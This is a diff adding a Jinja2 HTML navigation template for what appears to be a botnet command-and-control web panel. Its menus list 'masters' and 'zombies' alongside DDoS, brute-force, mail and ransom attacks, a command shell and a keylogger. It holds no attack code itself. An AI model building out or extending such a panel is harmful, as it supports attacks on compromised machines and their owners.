@@ -1,0 +1,98 @@
+
+
+{% block content %}
+
+
+<div class="window" id="navbar-window" style="background-color: grey;">
+  <div class="title-bar">
+    <div class="title-bar-text"><img style="display: inline; margin-right: 5px; margin-left: 3px; vertical-align:middle;" height="3%" width="3%" src="{{ url_for('static', filename='img/an-skull.gif') }}" /> {{ zession.username }}@{{ zession.remote_hostname }}</div>
+    <div class="title-bar-controls">
+      <button aria-label="Minimize" onclick="toggleMinimize('navbar-body')"></button>
+      <button aria-label="Maximize"></button>
+      <button aria-label="Close" onclick="document.getElementById('navbar-window').remove()"></button>
+    </div>
+  </div>
+
+  <div class="window-body" id="navbar-body">
+
+      <ul class="tree-view">
+
+          <li>
+          {% if zession.current_section == 'members' %}
+            <details open>
+          {% else %}
+            <details>
+          {% endif %}
+          <summary>👨‍💻  members</summary>
+          <ul>
+              <li><a href="{{ url_for('masters') }}">
+                  <span class="emoji">🐯  </span>
+                  <span class="mtext">masters</span></a></li>
+              <li><a href="{{ url_for('zombies') }}">
+                  <span class="emoji">🧟‍♂️ </span>
+                  <span class="mtext">zombies</span></a></li>
+          </ul>
+          </details>
+          </li>
+
+          <li>
+          {% if zession.current_section == 'tools' %}
+            <details open>
+          {% else %}
+            <details>
+          {% endif %}
+          <summary>🛠️  tools</summary>
+          <ul>
+              <li><a href="{{ url_for('ddos_attacks') }}">
+                  <span class="emoji">📯  </span>
+                  <span class="mtext">ddos attacks</span></a></li>
+              <li><span class="emoji">📫  </span>
+                  <span class="mtext">mail attacks</span></li>
+              <li><a href="{{ url_for('brute_attacks') }}">
+                  <span class="emoji">🎰  </span>
+                  <span class="mtext">brute-force attacks</span></a></li>
+              <li><span class="emoji">🔐  </span>
+                  <span class="mtext">ransom attacks</span></li>
+              <li><span class="emoji">🕷️  </span>
+                  <span class="mtext">crawling</span></li>
+              <li><span class="emoji">🐚  </span>
+                  <span class="mtext">command shell</span></li>
+              <li><span class="emoji">📅  </span>
+                  <span class="mtext">task scheduler</span></li>
+              <li><span class="emoji">✅ </span>
+                  <span class="mtext">plugins</span></li>
+          </ul>
+          </details>
+          </li>
+
+          <li>
+          {% if zession.current_section == 'logs' %}
+            <details open>
+          {% else %}
+            <details>
+          {% endif %}
+          <summary>
+              <span class="emoji">📔  </span>
+              <span class="mtext">logs</span>
+          </summary>
+          <ul>
+              <li><a href="{{ url_for('access_logs') }}">
+                  <span class="emoji">➡️  </span>
+                  <span class="mtext">access logs</span>
+              </a></li>
+              <li><span class="emoji">⌨️  </span>
+                  <span class="mtext">keylogger</span></li>
+          </ul>
+          </details>
+          </li>
+          <li><a href="{{ url_for('logout') }}">❌  logout</a></li>
+
+      </ul>
+
+  </div>
+
+
+</div>
+
+
+{% endblock %}
